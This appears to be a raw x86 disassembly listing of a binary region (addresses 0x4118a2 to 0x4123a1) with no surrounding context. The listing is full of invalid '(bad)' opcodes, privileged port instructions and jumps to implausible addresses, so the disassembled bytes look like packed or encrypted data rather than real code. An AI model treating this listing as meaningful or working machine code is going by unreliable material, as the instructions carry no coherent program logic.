  4118a2:	mov    bl,0xfe
  4118a4:	loope  0x411917
  4118a6:	ss pop edx
  4118a8:	mov    ebp,0x4b03b41e
  4118ad:	cmp    ecx,DWORD PTR [ecx-0x4457257c]
  4118b3:	inc    BYTE PTR [eax]
	...
  4118dd:	add    cl,al
  4118df:	or     DWORD PTR [ebx-0x4437557c],0xaf06bffe
  4118e9:	imul   BYTE PTR [ecx+0x3e02aad0]
  4118ef:	jb     0x411925
  4118f1:	or     al,BYTE PTR [ecx-0x6e09510a]
  4118f7:	call   0x727f1ba6
  4118fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118fd:	sbb    DWORD PTR [ecx+0x70af745a],eax
  411903:	pop    edi
  411904:	pop    ebp
  411905:	mov    esp,0xbc5d6eaa
  41190a:	push   0x68ab935f
  41190f:	pop    edi
  411910:	inc    ebp
  411911:	mov    esp,0x3b5152d2
  411916:	push   edx
  411917:	pop    edi
  411918:	xor    eax,0x356e8a80
  41191d:	mov    esp,0xde9c5a40
  411922:	cmp    BYTE PTR [ecx+0x5f30b40c],ch
  411928:	add    BYTE PTR [eax-0x43f2a169],bl
  41192e:	jmp    0x5874:0x18bbfd6f
  411935:	sub    DWORD PTR [ecx],edx
  411937:	pop    edi
  411938:	cmc    
  411939:	jne    0x41195c
  41193b:	addr16 in eax,dx
  41193d:	mov    ebx,0xabf0e900
	...
  41196a:	add    BYTE PTR [eax],al
  41196c:	fstp   QWORD PTR [ebp-0x23]
  41196f:	mov    ebx,0xb3c0a8f0
  411974:	call   0x5474d9d7
  411979:	pop    esi
  41197a:	lds    edi,FWORD PTR [ebx-0x40309c7e]
  411980:	rcr    DWORD PTR [esi-0x4b],cl
  411983:	mov    ebx,0x97c05f52
  411988:	imul   ebx,DWORD PTR [ebx-0x17],0xffffffcc
  41198c:	jg     0x4119e1
  41198e:	jmp    0x69b0dee3
  411993:	shl    BYTE PTR [ebp+0x6e2de8f1],0x5e
  41199a:	sti    
  41199b:	or     esp,DWORD PTR [esi-0x6f44fa2c]
  4119a1:	aam    0xff
  4119a3:	sub    eax,esi
  4119a5:	neg    ah
  4119a7:	or     bh,bl
  4119a9:	pop    edx
  4119aa:	(bad)  
  4119ab:	fadd   QWORD PTR [ebp+0x73]
  4119ae:	mov    ds:0xfe5db55f,al
  4119b3:	fdiv   QWORD PTR [ecx-0x6a1e8ba3]
  4119b9:	stos   BYTE PTR es:[edi],al
  4119ba:	inc    si
  4119bc:	xchg   ebp,eax
  4119bd:	xchg   ebx,eax
  4119be:	shl    ebp,0x3d
  4119c1:	or     BYTE PTR [ebx-0x4653ebb],cl
  4119c7:	xchg   edi,eax
  4119c8:	in     al,dx
  4119c9:	lock call DWORD PTR [edx-0xe8ba2ce]
	...
  4119f8:	add    BYTE PTR [eax],al
  4119fa:	in     eax,0x7
  4119fc:	addr16 push ss
  4119fe:	in     eax,0xd2
  411a00:	inc    esp
  411a01:	or     eax,0xb12e26b1
  411a06:	sbb    BYTE PTR [ebx-0x75],0xbc
  411a0a:	or     edx,DWORD PTR [esi]
  411a0c:	inc    ecx
  411a0d:	jmp    0x754136cf
  411a12:	jle    0x411a07
  411a14:	lea    ecx,[ebp-0x7d]
  411a17:	pop    ebx
  411a18:	push   edi
  411a19:	shr    DWORD PTR [eax],1
  411a1b:	add    eax,0x9b38e900
  411a20:	jae    0x411a10
  411a22:	(bad)  
  411a23:	jae    0x4119eb
  411a25:	cmp    dl,BYTE PTR [ebp+0x3a514f5c]
  411a2b:	pop    ebx
  411a2c:	out    dx,eax
  411a2d:	ja     0x411a44
  411a2f:	ret    
  411a30:	arpl   WORD PTR [eax],bp
  411a32:	cmp    cl,BYTE PTR [ebx]
  411a34:	call   FWORD PTR [edx+ecx*2]
  411a37:	jae    0x411a0b
  411a39:	jnp    0x411a2f
  411a3b:	pop    esp
  411a3c:	out    0xb5,eax
  411a3e:	pop    edx
  411a3f:	pop    esi
  411a40:	inc    BYTE PTR [edx+0x80153a]
  411a46:	sbb    DWORD PTR [ecx+0x75],0x31a359fa
  411a4d:	ror    BYTE PTR [esi-0x5f],0xfd
  411a51:	call   DWORD PTR [eax]
  411a53:	test   al,0xac
  411a55:	cmp    BYTE PTR [eax+0x2a],ch
  411a58:	mov    ebx,0xfda58aff
  411a5d:	jne    0x411a5f
	...
  411a87:	add    BYTE PTR [edi-0x4f],bl
  411a8a:	addr16 lock mov al,ss:0x5e5d
  411a90:	push   cs
  411a91:	cwde   
  411a92:	add    al,BYTE PTR [eax]
  411a94:	stos   BYTE PTR es:[edi],al
  411a95:	int3   
  411a96:	jmp    0x9ac7:0x51a21b83
  411a9d:	mov    eax,ds:0x5927fffe
  411aa2:	mov    DWORD PTR [ebp+0x53],0x17000058
  411aa9:	into   
  411aaa:	inc    ebx
  411aab:	or     al,0x94
  411aad:	pusha  
  411aae:	(bad)  
  411aaf:	je     0x411abf
  411ab1:	outs   dx,BYTE PTR ds:[esi]
  411ab2:	mov    esi,0xc8fd352b
  411ab7:	ret    0x5923
  411aba:	mov    ebx,0x591701
  411abf:	jmp    0x411a47
  411ac1:	(bad)  
  411ac2:	jnp    0x411ad4
  411ac4:	out    0x2c,eax
  411ac6:	add    eax,0x89471a8b
  411acb:	sbb    al,dh
  411acd:	sub    al,0xc
  411acf:	call   FWORD PTR [edx]
  411ad1:	dec    edi
  411ad2:	call   0xfde3964d
  411ad7:	or     DWORD PTR [eax+edx*2+0x1dde0575],0xfffffff8
  411adf:	jmp    0x411b4a
  411ae1:	pop    es
  411ae2:	and    eax,0xfda2d07f
  411ae7:	or     DWORD PTR [esi],edi
  411ae9:	das    
  411aea:	mov    esp,0x57
	...
  411b13:	add    BYTE PTR [eax],al
  411b15:	add    bh,dl
  411b17:	repnz add eax,DWORD PTR [eax]
  411b1a:	ds pop edi
  411b1c:	add    al,0xeb
  411b1e:	dec    ebp
  411b1f:	icebp  
  411b20:	mov    esp,0x8b7f1307
  411b25:	inc    esp
  411b26:	xchg   cl,bh
  411b28:	dec    esi
  411b29:	cld    
  411b2a:	dec    ecx
  411b2b:	into   
  411b2c:	lds    eax,FWORD PTR [edi]
  411b2e:	jg     0x411b42
  411b30:	or     al,0x89
  411b32:	add    ecx,DWORD PTR [edx]
  411b34:	mov    edx,DWORD PTR [edx+eiz*2+0x19]
  411b38:	adc    eax,0x8d1a038b
  411b3d:	push   esp
  411b3e:	push   edx
  411b3f:	ins    DWORD PTR es:[edi],dx
  411b40:	pop    esi
  411b41:	rol    DWORD PTR [ecx+0x33],0xa4
  411b45:	push   es
  411b46:	mov    bh,0xb7
  411b48:	mov    edx,0x45369388
  411b4d:	xor    DWORD PTR ds:0xb59a306b,0xffffffae
  411b54:	push   es
  411b55:	and    DWORD PTR [esi+0x72],0x2d
  411b59:	push   es
  411b5a:	gs xor ch,ch
  411b5d:	shl    DWORD PTR ds:0x6448b74,1
  411b63:	stc    
  411b64:	dec    esi
  411b65:	cld    
  411b66:	gs cmp eax,esi
  411b69:	or     edi,DWORD PTR [esi]
  411b6b:	pop    ds
  411b6c:	(bad)  
  411b6d:	jmp    0x411b2c
  411b6f:	mov    ch,0xae
  411b71:	mov    al,ds:0x41f462
  411b76:	daa    
  411b77:	aaa    
  411b78:	or     BYTE PTR [esi+0x0],dh
	...
  411ba3:	add    BYTE PTR [eax+0x49],al
  411ba6:	(bad)  
  411ba7:	enter  0x81fc,0x2
  411bab:	call   DWORD PTR [ebx]
  411bad:	push   cs
  411bae:	mov    al,BYTE PTR [eax+0x3e]
  411bb1:	call   0x8aa6:0x5ab967b8
  411bb8:	cli    
  411bb9:	bound  ebp,QWORD PTR [ebx+0x3e]
  411bbc:	stos   BYTE PTR es:[edi],al
  411bbd:	or     al,BYTE PTR [ecx-0x72a3fe04]
  411bc3:	mov    eax,0x2e864712
  411bc8:	inc    edx
  411bc9:	pop    esp
  411bca:	repz mov ebx,0xabe0e588
  411bd0:	icebp  
  411bd1:	imul   DWORD PTR [ebp-0x48]
  411bd4:	inc    esp
  411bd5:	fwait
  411bd6:	cmc    
  411bd7:	jg     0x411b74
  411bd9:	pop    edx
  411bda:	jmp    0xe52684e2
  411bdf:	mov    eax,0x2e4d62ea
  411be4:	pop    edx
  411be5:	jb     0x411c43
  411be7:	and    dl,BYTE PTR [ecx+0x5b]
  411bea:	jno    0x411c2a
  411bec:	cmp    ah,BYTE PTR [eax]
  411bee:	lods   al,BYTE PTR ds:[esi]
  411bef:	adc    esi,DWORD PTR [ecx]
  411bf1:	fadd   DWORD PTR [ebx+eax*1+0x2e265b3e]
  411bf8:	dec    edx
  411bf9:	pop    edx
  411bfa:	xchg   ebp,eax
  411bfb:	or     edx,DWORD PTR [esi]
  411bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bfe:	mov    bh,BYTE PTR [eax-0x505b1ae0]
  411c04:	and    al,0xd0
  411c06:	push   es
  411c07:	inc    esi
	...
  411c30:	add    BYTE PTR [eax],al
  411c32:	or     al,BYTE PTR [edi+0x4f828c19]
  411c38:	(bad)  
  411c39:	fstp   QWORD PTR [ebp+0x4503a8e9]
  411c3f:	sub    eax,0xc3e5025c
  411c44:	push   ecx
  411c45:	add    al,0x8e
  411c47:	pop    edx
  411c48:	pop    ebp
  411c49:	or     al,0xd6
  411c4b:	ja     0x411c94
  411c4d:	mov    bh,0xd8
  411c4f:	pop    edx
  411c50:	cmp    eax,0xefd0d110
  411c55:	stos   DWORD PTR es:[edi],eax
  411c56:	daa    
  411c57:	mov    esi,0xe589b600
  411c5c:	push   ebx
  411c5d:	aad    0xbc
  411c5f:	xchg   esp,eax
  411c60:	add    BYTE PTR [esp+edi*1],bl
  411c63:	inc    esi
  411c64:	dec    ecx
  411c65:	jo     0x411c66
  411c67:	dec    esi
  411c68:	mov    ah,ah
  411c6a:	inc    ecx
  411c6b:	jmp    0x43fe05af
  411c70:	add    eax,0x14cfc918
  411c75:	sbb    cl,dl
  411c77:	iret   
  411c78:	clc    
  411c79:	jbe    0x411cca
  411c7b:	arpl   ax,bp
  411c7d:	lahf   
  411c7e:	sbb    al,0x5a
  411c80:	inc    al
  411c82:	inc    esp
  411c83:	sbb    esi,DWORD PTR [ebx+ebp*8-0x6c]
  411c87:	jg     0x411cd8
  411c89:	push   esi
  411c8a:	das    
  411c8b:	push   ebx
  411c8c:	(bad)  
  411c8d:	aam    0x91
  411c8f:	inc    edx
  411c90:	adc    al,0xc8
  411c92:	mov    BYTE PTR [ecx-0x2],bl
  411c95:	mov    ah,0x0
	...
  411cbf:	add    BYTE PTR [ecx-0x7736f7be],dl
  411cc5:	pop    ecx
  411cc6:	cmp    al,0xe9
  411cc8:	cmp    eax,0x3f9f069b
  411ccd:	inc    esi
  411cce:	or     DWORD PTR [edx+0x67],ebp
  411cd1:	dec    edi
  411cd2:	add    DWORD PTR [ebx+eiz*4+0x4f0e1945],ebx
  411cd9:	push   edi
  411cda:	jmp    0xfe9b8639
  411cdf:	es jg  0x411d39
  411ce2:	add    ecx,ebp
  411ce4:	cmp    eax,0x49a4895b
  411ce9:	and    al,BYTE PTR [ecx]
  411ceb:	jmp    0xde41782d
  411cf0:	cs push ebx
  411cf2:	jmp    0xfe9b5dcc
  411cf7:	bound  edi,QWORD PTR [esi+0x57]
  411cfa:	enter  0xa500,0x6d
  411cfe:	add    BYTE PTR [ebp+0x4c],dl
  411d01:	add    dl,BYTE PTR [edi-0x75]
  411d04:	adc    ah,BYTE PTR [ebx-0x7f]
  411d07:	rcr    BYTE PTR [edi+0x40fce8ad],0x12
  411d0e:	dec    DWORD PTR [ebx+0xc7510df]
  411d14:	sbb    BYTE PTR [ecx-0x1],bl
  411d17:	jne    0x411cb0
  411d19:	loopne 0x411d61
  411d1b:	add    al,0x24
  411d1d:	xchg   ebx,eax
  411d1e:	or     al,0x0
  411d20:	xchg   ebx,eax
  411d21:	pusha  
  411d22:	std    
  411d23:	jne    0x411d25
	...
  411d4d:	add    BYTE PTR [ebx+0x570846e2],bl
  411d53:	adc    dh,BYTE PTR [ebp+0x8]
  411d56:	movq   mm5,QWORD PTR [eax-0x1]
  411d5a:	or     ch,ah
  411d5c:	inc    esp
  411d5d:	adc    al,0xde
  411d5f:	push   ebp
  411d60:	mov    dh,0x1
  411d62:	addr16 pop ebp
  411d64:	add    BYTE PTR [edi+0xe],bl
  411d67:	sbb    al,0xe
  411d69:	add    BYTE PTR [edx+0x1383e9e4],dh
  411d6f:	or     cl,BYTE PTR [ebx+0x1a1355]
  411d75:	add    BYTE PTR [edi],ah
  411d77:	pop    ebp
  411d78:	add    BYTE PTR [ebx],ch
  411d7a:	or     DWORD PTR gs:[ebp+0xc],eax
  411d7e:	push   ss
  411d7f:	pop    ebp
  411d80:	add    BYTE PTR [eax],al
  411d82:	clc    
  411d83:	call   0x60fba147
  411d88:	add    BYTE PTR [ebp-0x1c],dh
  411d8b:	adc    DWORD PTR [ebp+0x14],esi
  411d8e:	mov    ebp,0xbd006a5d
  411d93:	pop    esp
  411d94:	call   0xff4ff629
  411d99:	jmp    0x417aec
  411d9e:	lds    esi,FWORD PTR ds:0xdfaf3f0c
  411da5:	dec    BYTE PTR [ebx+0x32]
  411da8:	mov    ch,0x74
  411daa:	sub    dh,BYTE PTR ss:[ecx]
  411dad:	(bad)  
  411daf:	adc    DWORD PTR [edx+0x44],ecx
	...
  411dd9:	add    BYTE PTR [eax],al
  411ddb:	add    BYTE PTR [edx+0x24142e09],bh
  411de1:	inc    edx
  411de2:	sub    BYTE PTR [ebx+edi*4],al
  411de5:	jg     0x411d9f
  411de7:	dec    edi
  411de8:	xchg   esi,eax
  411de9:	imul   esi,DWORD PTR [ebx+0x4db99fe],0x81423e02
  411df3:	jl     0x411e2f
  411df5:	inc    esp
  411df6:	das    
  411df7:	and    eax,DWORD PTR [ecx-0xc00eda9]
  411dfd:	cmp    DWORD PTR [edx-0x4c3f23e3],ebp
  411e03:	mov    BYTE PTR [ebx],al
  411e05:	mov    dh,0xb3
  411e07:	je     0x411e53
  411e09:	sbb    al,0x2
  411e0b:	push   0x42
  411e0d:	mov    bh,0x3d
  411e0f:	cld    
  411e10:	out    dx,al
  411e11:	test   eax,0x9949fef6
  411e16:	test   eax,0x2423fd6
  411e1b:	cmp    DWORD PTR [ebx+0x5e750136],0xffffff81
  411e22:	sub    eax,0xb5459410
  411e27:	je     0x411e5f
  411e29:	pop    edx
  411e2a:	inc    edi
  411e2b:	bound  ebx,QWORD PTR [ecx]
  411e2d:	imul   esi,DWORD PTR [ebx+0xec2a74],0x1ec3e6a
  411e37:	call   0xfef66f62
  411e3c:	out    0x92,eax
  411e3e:	add    DWORD PTR [eax],eax
	...
  411e68:	add    BYTE PTR [eax],al
  411e6a:	ds pop ebx
  411e6c:	push   0x36
  411e6e:	cmp    bl,BYTE PTR [edi+0x54]
  411e71:	loope  0x411e53
  411e73:	int    0xf7
  411e75:	mov    ah,0x52
  411e77:	arpl   WORD PTR [edi-0x38a7a1a0],di
  411e7d:	mov    al,BYTE PTR [edx+0x2a2ebf57]
  411e83:	(bad)
  411e86:	inc    edx
  411e87:	out    0x24,al
  411e89:	mov    eax,0xb5974301
  411e8e:	test   al,0x57
  411e90:	xchg   ecx,eax
  411e91:	mov    edi,DWORD PTR [esi]
  411e93:	pop    ebx
  411e94:	out    0x80,eax
  411e96:	sbb    ah,BYTE PTR [edi-0x1c]
  411e99:	sub    DWORD PTR cs:[eax-0x3],ebx
  411e9d:	adc    edx,DWORD PTR [ecx+eiz*2]
  411ea0:	jle    0x411ed0
  411ea2:	ss inc ebx
  411ea4:	je     0x411ec8
  411ea6:	jns    0x411eff
  411ea8:	xor    BYTE PTR [edx],al
  411eaa:	ds pop ebx
  411eac:	out    0xaa,eax
  411eae:	aam    0x59
  411eb0:	out    0x3,eax
  411eb2:	mov    ebp,0xd2fde3d5
  411eb7:	jp     0x411f07
  411eb9:	(bad)
  411ebe:	shl    BYTE PTR [edx+0x4f],cl
  411ec1:	aam    0xde
  411ec3:	push   edi
  411ec4:	aaa    
  411ec5:	mov    ah,0xb2
  411ec7:	outs   dx,DWORD PTR ds:[esi]
  411ec8:	rol    DWORD PTR [eax],0xa4
  411ecb:	pop    ebx
  411ecc:	xchg   ecx,eax
  411ecd:	add    eax,DWORD PTR [eax]
	...
  411ef7:	add    BYTE PTR [esi],dl
  411ef9:	or     BYTE PTR [esi],bl
  411efb:	mov    ah,0x20
  411efd:	inc    ebp
  411efe:	lods   eax,DWORD PTR ds:[esi]
  411eff:	add    bh,BYTE PTR [esi]
  411f01:	pop    ebx
  411f02:	push   0x36
  411f04:	inc    edx
  411f05:	pop    esi
  411f06:	jl     0x411eeb
  411f08:	or     cl,dl
  411f0a:	xlat   BYTE PTR ds:[ebx]
  411f0b:	sub    DWORD PTR [esi],esi
  411f0d:	push   esi
  411f0e:	add    DWORD PTR [ebp+eax*2+0x43],edi
  411f12:	mov    eax,0xfe55aa88
  411f17:	pop    esp
  411f18:	inc    esi
  411f19:	rol    DWORD PTR [ecx],0x53
  411f1c:	cmp    al,cl
  411f1e:	add    cl,al
  411f20:	les    ebx,FWORD PTR [eax-0x2]
  411f23:	into   
  411f24:	mov    bl,0x75
  411f26:	(bad)  
  411f27:	call   0xedbcf969
  411f2c:	(bad)
  411f2f:	scas   al,BYTE PTR es:[edi]
  411f30:	pop    es
  411f31:	push   edi
  411f32:	add    ecx,ebp
  411f34:	cmp    eax,0x461cfd5b
  411f39:	rol    DWORD PTR [eax],0x13
  411f3c:	ss call 0x4333b485
  411f42:	gs (bad) 
  411f44:	int    0x55
  411f46:	call   0x9c61cf
  411f4b:	push   0x4f
  411f4d:	addr16 pop es
  411f4f:	cld    
  411f50:	dec    ecx
  411f51:	push   ds
  411f52:	inc    esp
  411f53:	ins    DWORD PTR es:[edi],dx
  411f54:	cmp    ebx,DWORD PTR [ebx+0x0]
  411f57:	jmp    0xd355ef08
	...
  411f84:	add    BYTE PTR [eax],al
  411f86:	cmp    eax,0x76404c1
  411f8b:	push   edi
  411f8c:	push   ecx
  411f8d:	inc    ecx
  411f8e:	clc    
  411f8f:	push   esp
  411f90:	inc    BYTE PTR [esi-0x55]
  411f93:	xor    DWORD PTR [ecx],eax
  411f95:	jmp    0xe5bcf9d7
  411f9a:	cmp    ecx,edi
  411f9c:	or     dh,BYTE PTR [ecx+0x3a]
  411f9f:	pop    ebx
  411fa0:	add    cl,ch
  411fa2:	retf   0x120
  411fa5:	jmp    0xe5bcf9e7
  411faa:	sbb    bh,cl
  411fac:	or     dl,BYTE PTR [ecx+0x3a]
  411faf:	pop    ebx
  411fb0:	add    BYTE PTR [eax],al
  411fb2:	pop    ss
  411fb3:	idiv   DWORD PTR [edx-0x7ea5e900]
  411fb9:	jge    0x411f9e
  411fbb:	push   ebp
  411fbc:	jo     0x412013
  411fbe:	fsubr  QWORD PTR [edi]
  411fc0:	jb     0x412013
  411fc2:	push   esi
  411fc3:	mov    ecx,DWORD PTR [eax+eax*1]
  411fc6:	xlat   BYTE PTR ds:[ebx]
  411fc7:	cdq    
  411fc8:	push   es
  411fc9:	jae    0x411fea
  411fcb:	or     dh,BYTE PTR [ebp+0xc]
  411fce:	jo     0x411f73
  411fd0:	hlt    
  411fd1:	xor    DWORD PTR [edx+0x13],0xa
  411fd5:	shl    DWORD PTR [edx+0x13],1
  411fd8:	push   DWORD PTR [ebp-0x5]
  411fdb:	icebp  
  411fdc:	add    BYTE PTR [esi-0x20],ah
  411fdf:	or     BYTE PTR [ecx+0x7508df45],cl
  411fe5:	adc    al,al
  411fe7:	xchg   edx,eax
  411fe8:	hlt    
  411fe9:	inc    DWORD PTR [eax]
	...
  412013:	add    BYTE PTR [edx],bh
  412015:	pop    es
  412016:	push   DWORD PTR [ebp-0x61]
  412019:	icebp  
  41201a:	pop    ecx
  41201b:	pusha  
  41201c:	ror    BYTE PTR [eax],0xff
  41201f:	jne    0x41208c
  412021:	ja     0x412025
  412023:	(bad)  
  412024:	jp     0x412033
  412026:	push   DWORD PTR [ebp-0x11]
  412029:	icebp  
  41202a:	sar    ch,1
  41202c:	loopne 0x412036
  41202e:	push   DWORD PTR [ebp-0x21]
  412031:	icebp  
  412032:	mov    ebx,0xb608f065
  412037:	add    DWORD PTR [edi+0x59],esp
  41203a:	add    bl,ch
  41203c:	ja     0x41201a
  41203e:	jl     0x41204c
  412040:	push   edx
  412041:	(bad)  
  412042:	push   ebx
  412043:	or     edx,DWORD PTR [ebp-0x6d]
  412046:	dec    edi
  412047:	and    edx,0xd7fffe54
  41204d:	bound  esi,QWORD PTR [ecx+0x48]
  412050:	inc    eax
  412051:	xchg   ebx,eax
  412052:	or     al,0x8f
  412054:	ds pop es
  412056:	mov    dh,0x82
  412058:	mov    ds:0x9bd1006e,eax
  41205d:	push   esi
  41205e:	mov    al,0x74
  412060:	or     ch,BYTE PTR [ebx+0x67]
  412063:	fs stc 
  412065:	dec    ebp
  412066:	jp     0x4120ac
  412068:	test   BYTE PTR [ebp+0x36],0x10
  41206c:	jmp    0x6c3fd928
  412071:	cmp    dh,BYTE PTR [eax+0x21a4674]
  412077:	pusha  
	...
  4120a0:	add    BYTE PTR [eax],al
  4120a2:	shl    DWORD PTR ds:0xa83274b0,1
  4120a8:	add    edi,edi
  4120aa:	dec    ebx
  4120ab:	push   cs
  4120ac:	mov    al,0x74
  4120ae:	mov    dh,0x1a
  4120b0:	cmp    edi,ebp
  4120b2:	mov    cl,0x5
  4120b4:	mov    al,0x74
  4120b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120b7:	jmp    0x6c:0xf5a16523
  4120be:	ds inc edx
  4120c0:	add    ch,bl
  4120c2:	cmp    ebp,DWORD PTR [edx+0x423e0004]
  4120c8:	mov    ebx,0x57422ec1
  4120cd:	mov    ebp,DWORD PTR [edx+0x74]
  4120d0:	cmp    DWORD PTR [esi+eax*2+0x42],0x37
  4120d5:	add    eax,0x3c68b08
  4120da:	ds leave 
  4120dc:	xor    eax,0xb1386508
  4120e1:	xor    eax,0xff256a66
  4120e6:	dec    ecx
  4120e7:	ror    edx,0x3
  4120ea:	mov    ebp,0x2f750254
  4120ef:	lea    esi,ds:0x255a2608
  4120f5:	jmp    FWORD PTR [ecx]
  4120f7:	pop    ebx
  4120f8:	lds    edi,FWORD PTR [edx+0x56e75eff]
  4120fe:	lds    eax,FWORD PTR [esi+0x63]
  412101:	inc    edi
  412102:	inc    esi
  412103:	loopne 0x4120b9
  412105:	inc    DWORD PTR [eax]
	...
  41212f:	add    BYTE PTR [esi+ebx*2+0x6b828557],dh
  412136:	out    0x37,eax
  412138:	inc    ecx
  412139:	loopne 0x4120d7
  41213b:	adc    esi,ecx
  41213d:	mov    bl,BYTE PTR [esi+0x6]
  412140:	mov    ebp,0x6a03fbd5
  412145:	arpl   WORD PTR [edx+0x56],si
  412148:	xor    dl,BYTE PTR [eax+ebx*2+0x8]
  41214c:	rcr    DWORD PTR [eax+0x6a],0x2e
  412150:	es pop ebx
  412152:	cmp    edi,ebx
  412154:	mov    ah,0xad
  412156:	fist   WORD PTR [ebx-0x37]
  412159:	pop    eax
  41215a:	push   0x5
  41215c:	inc    esi
  41215d:	and    ch,BYTE PTR [edx+0x72ae3e17]
  412163:	lahf   
  412164:	mov    esp,0xf058bc1e
  412169:	fild   QWORD PTR [esp+edx*1]
  41216c:	jns    0x4121c8
  41216e:	out    0x3,eax
  412170:	ds pop ebx
  412172:	jb     0x4121ba
  412174:	xor    bl,BYTE PTR [eax+ebp*8]
  412177:	add    edi,DWORD PTR [esi]
  412179:	pop    ebx
  41217a:	out    0x84,eax
  41217c:	repnz (bad) 
  41217e:	out    0x36,eax
  412180:	and    BYTE PTR ss:[edi],0x51
  412184:	add    DWORD PTR [edx],esp
  412186:	sub    bh,bh
  412188:	pop    ecx
  412189:	push   esp
  41218a:	(bad)  
  41218c:	pop    ecx
  41218d:	in     eax,dx
  41218e:	stos   DWORD PTR es:[edi],eax
  41218f:	mov    al,0x48
  412191:	pop    edi
  412192:	daa    
  412193:	add    BYTE PTR ss:[eax],al
	...
  4121be:	and    BYTE PTR ss:[edi],0x51
  4121c2:	cdq    
  4121c3:	and    al,0x1
  4121c5:	sub    esi,DWORD PTR [ecx]
  4121c7:	push   ebx
  4121c8:	mov    DWORD PTR [ebp+edx*8-0x3a0e8baf],esp
  4121cf:	add    eax,0x19ce1e5f
  4121d4:	inc    esp
  4121d5:	sbb    eax,0xe9005b3c
  4121da:	mov    BYTE PTR [edi-0x687f6614],dl
  4121e0:	hlt    
  4121e1:	cdq    
  4121e2:	scas   al,BYTE PTR es:[edi]
  4121e3:	(bad)  
  4121e4:	or     BYTE PTR [ecx],al
  4121e6:	push   ss
  4121e7:	push   ebp
  4121e8:	(bad)  
  4121e9:	out    dx,al
  4121ea:	xlat   BYTE PTR ds:[ebx]
  4121eb:	xchg   edi,eax
  4121ec:	in     al,dx
  4121ed:	pop    esi
  4121ee:	in     al,0xdd
  4121f0:	jnp    0x4121c7
  4121f2:	inc    edx
  4121f3:	mov    DWORD PTR [edx+eiz*8],0x208ceef
  4121fa:	add    dh,BYTE PTR [ecx+0x66fcb05d]
  412200:	add    BYTE PTR [edx],dl
  412202:	pop    es
  412203:	aas    
  412204:	mov    BYTE PTR [edx+edx*8],ch
  412207:	fstp   TBYTE PTR [ebx-0x3f]
  41220a:	inc    edx
  41220b:	pop    ebx
  41220c:	mov    al,ds:0x29636be9
  412211:	test   eax,0xabc7b208
  412216:	ds pop ebx
  412218:	mov    DWORD PTR [edx+ebp*4],esp
  41221b:	sbb    esp,ecx
  41221d:	jmp    0x41220c
  41221f:	inc    edx
  412220:	imul   eax,DWORD PTR ds:0x0,0x0
	...
  41224a:	add    BYTE PTR [eax],al
  41224c:	test   eax,0xae2c8851
  412251:	in     eax,0xf8
  412253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412254:	div    DWORD PTR [esi]
  412256:	add    ecx,ebp
  412258:	cmp    eax,0xbf1ae95b
  41225d:	xchg   edi,eax
  41225e:	lock mov ecx,0xb9f497be
  412264:	cwde   
  412265:	(bad)  
  412266:	or     BYTE PTR [eax],al
  412268:	out    dx,eax
  412269:	cmp    edx,0x4cd678ff
  41226f:	lock sub al,0x9b
  412272:	call   0xd09645ee
  412277:	je     0x4122a0
  412279:	add    DWORD PTR [ebp-0x4],esi
  41227c:	das    
  41227d:	bound  esp,QWORD PTR [edi+edi*8+0x28]
  412281:	ss mov esi,0xc00ed85e
  412287:	or     al,0x17
  412289:	das    
  41228a:	dec    ebp
  41228b:	call   0xac25c588
  412290:	fs mov eax,gs
  412293:	add    BYTE PTR [ecx+0x58],dh
  412296:	cmp    DWORD PTR [ebp+0x3],0x64c1735e
  41229d:	mov    ebp,eax
  41229f:	add    BYTE PTR [edx+0x59],dh
  4122a2:	cmp    DWORD PTR [ebp-0xd],0xf810735d
  4122a9:	xchg   edx,eax
  4122aa:	cld    
  4122ab:	call   0x3e9fa7
	...
  4122d8:	add    BYTE PTR [eax],al
  4122da:	cmp    al,0x17
  4122dc:	pop    esp
  4122dd:	pop    edi
  4122de:	ficomp WORD PTR [ebx]
  4122e0:	or     al,BYTE PTR [eax]
  4122e2:	adc    al,0x8b
  4122e4:	in     al,0x0
  4122e6:	xor    ah,BYTE PTR [edi+eiz*8-0x75]
  4122ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122eb:	pop    ebp
  4122ec:	add    BYTE PTR [ebx+0x75fd6762],cl
  4122f2:	mov    bl,0xd0
  4122f4:	std    
  4122f5:	mov    ah,BYTE PTR [edx]
  4122f7:	add    eax,ecx
  4122f9:	loopne 0x412360
  4122fb:	lods   eax,DWORD PTR ds:[esi]
  4122fc:	call   0xff4357e1
  412301:	mov    DWORD PTR [edx+0x1b7d8b21],edx
  412307:	aad    0x74
  412309:	cld    
  41230a:	ds popf 
  41230c:	dec    ecx
  41230d:	lods   eax,DWORD PTR ds:[esi]
  41230e:	mov    ch,0x93
  412310:	mov    BYTE PTR [esi+ebx*2+0x43],0x2
  412315:	add    BYTE PTR [esi],bh
  412317:	mov    edi,0xb78ee048
  41231c:	dec    eax
  41231d:	hlt    
  41231e:	mov    ?,esp
  412320:	scas   al,BYTE PTR es:[edi]
  412321:	je     0x412359
  412323:	push   0xffffff9e
  412325:	cli    
  412326:	sbb    DWORD PTR [edx-0x6],esi
  412329:	mov    edi,0x7c83368a
  41232e:	adc    al,BYTE PTR [ebx+0x36]
  412331:	push   es
  412332:	mov    ebp,0x72ffa1d7
  412337:	sbb    BYTE PTR [ebx+0x3642de7c],al
  41233d:	or     BYTE PTR [eax],al
	...
  412367:	add    cl,ch
  412369:	(bad)  
  41236a:	mov    eax,ds:0xaba5bbe7
  41236f:	(bad)  
  412370:	fldenv [edi+0x2824e7d0]
  412376:	lods   al,BYTE PTR ds:[esi]
  412377:	dec    cl
  412379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41237a:	mov    al,0xe7
  41237c:	dec    ebx
  41237d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41237e:	stos   DWORD PTR es:[edi],eax
  41237f:	(bad)  
  412380:	add    cl,BYTE PTR gs:[edi+0x5f]
  412384:	xchg   DWORD PTR [ecx+eax*1],eax
  412387:	add    BYTE PTR [ebp-0x5e555b89],dh
  41238d:	xchg   DWORD PTR [eax+0x4d61b82],ebp
  412393:	je     0x4123cd
  412395:	lds    ebp,FWORD PTR ds:0x90673ef4
  41239b:	mov    bh,bl
  41239d:	inc    ebp
  41239e:	lods   eax,DWORD PTR ds:[esi]
  41239f:	je     0x41233b
  4123a1:	rol    DWORD PTR [edi+edi*8],0xeb
